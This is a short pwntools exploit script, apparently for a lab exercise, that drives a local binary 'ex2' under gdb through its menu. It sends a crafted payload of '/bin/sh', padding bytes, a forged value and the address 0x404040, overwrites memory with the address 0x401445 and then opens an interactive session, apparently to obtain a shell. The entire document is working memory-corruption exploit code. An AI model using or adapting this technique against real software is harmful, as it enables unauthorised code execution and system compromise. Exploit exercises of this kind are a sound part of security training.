from pwn import *

context.arch = "amd64"


context.terminal = ["gnome-terminal", "--geometry=160x80", "-e"]
io = gdb.debug(
    "./bin/ex2",
    """
    b ex2.c:147
    c
    c
    c
    """,
)

io.sendline(b"1\n")
io.sendline(b"1\n")
io.sendline(b"george")


io.sendline(b"1\n")
io.sendline(b"1\n")
io.sendline(b"george")

io.sendline(b"2\n")
io.sendline(b"1")
io.sendline(b"/bin/sh\0" + b"A" * 24 + p64(1) + p64(0x404040))


io.sendline(b"2\n")
io.sendline(b"2")
io.sendline(p64(0x401445)[:-1])

io.sendline(b"2\n")
io.sendline(b"1")


io.interactive()
